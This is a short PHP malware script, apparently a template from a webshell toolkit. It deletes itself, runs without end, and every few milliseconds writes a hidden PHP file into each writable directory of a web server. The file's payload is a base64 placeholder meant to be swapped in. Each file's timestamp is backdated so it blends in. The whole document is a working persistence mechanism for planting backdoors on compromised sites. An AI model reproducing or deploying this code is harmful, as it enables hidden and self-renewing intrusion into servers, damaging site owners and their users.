<?php
ignore_user_abort(true);//进程运行
set_time_limit(0);
unlink(__FILE__);
function createSFile($dir) {
    if (!is_dir($dir) || !is_writable($dir)) { return; }

    $file = $dir.DIRECTORY_SEPARATOR.'.HM_NAME_REPLACE.php';
    $data = "WAIT_FOR_REPLACE";
    $directories = array_slice(scandir($dir),2);
    file_put_contents($file, base64_decode($data));
    system('touch -m -d "2018-12-01 09:10:12" '.$file);

    foreach ($directories as $directory) {
        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
        if (is_dir($subdir)) { createSFile($subdir); }
    }
}

while (1){
    createSFile(dirname(__FILE__));
    usleep(5000);
}
?>